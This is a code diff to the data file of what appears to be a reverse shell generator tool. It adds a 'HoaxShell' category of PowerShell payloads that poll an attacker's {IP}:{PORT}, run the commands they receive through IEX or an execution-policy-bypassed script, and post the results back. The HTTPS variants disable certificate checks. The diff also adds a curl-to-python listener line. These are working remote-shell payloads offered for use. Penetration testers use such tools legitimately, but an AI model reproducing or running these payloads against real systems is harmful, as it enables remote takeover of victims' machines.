@@ -2,7 +2,8 @@
 const CommandType = {
     'ReverseShell': 'ReverseShell',
     'BindShell': 'BindShell',
-    'MSFVenom': 'MSFVenom'
+    'MSFVenom': 'MSFVenom',
+    'HoaxShell': 'HoaxShell'
 };
 
 const withCommandType = function (commandType, elements) {
@@ -471,11 +472,68 @@ const msfvenomCommands =  withCommandType(
     ]
 );
 
+
+const hoaxShellCommands =  withCommandType(
+    CommandType.HoaxShell,
+    [
+        {
+            "name": "Windows CMD cURL http",
+            "command": "",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX http",
+            "command": "$s='{IP}:{PORT}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX Constr Lang Mode http",
+            "command": "$s='{IP}:{PORT}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile http",
+            "command": "$s='{IP}:{PORT}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile Constr Lang Mode http",
+            "command": "$s='{IP}:{PORT}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "Windows CMD cURL https",
+            "command": "",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell IEX https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{IP}:{PORT}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Constr Lang Mode IEX https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{IP}:{PORT}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{IP}:{PORT}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
+            "meta": ["windows"]
+        },
+        {
+            "name": "PowerShell Outfile Constr Lang Mode https",
+            "command": "add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{IP}:{PORT}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f=\"C:\Users\$env:USERNAME\.local\hack.ps1\";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{\"Authorization\"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
+            "meta": ["windows"]
+        }
+    ]
+);
+
 const rsgData = {
 
     listenerCommands: [
         ['nc', 'nc -lvnp {port}'],
-		  ['busybox nc', 'busybox nc -lp {port}'],
+	['busybox nc', 'busybox nc -lp {port}'],
         ['ncat', 'ncat -lvnp {port}'],
         ['ncat.exe', 'ncat.exe -lvnp {port}'],
         ['ncat (TLS)', 'ncat --ssl -lvnp {port}'],
@@ -487,7 +545,8 @@ const rsgData = {
         ['socat', 'socat -d -d TCP-LISTEN:{port} STDOUT'],
         ['socat (TTY)', 'socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}'],
         ['powercat', 'powercat -l -p {port}'],
-        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"']
+        ['msfconsole', 'msfconsole -q -x "use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit"'],
+	['hoaxshell', 'sudo python3 -c $(curl -s ) -t {payload}']
     ],
 
     shells: ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash'],
@@ -501,7 +560,8 @@ const rsgData = {
     reverseShellCommands: [
         ...reverseShellCommands,
         ...bindShellCommands,
-        ...msfvenomCommands
+        ...msfvenomCommands,
+        ...hoaxShellCommands
     ]
 }
 
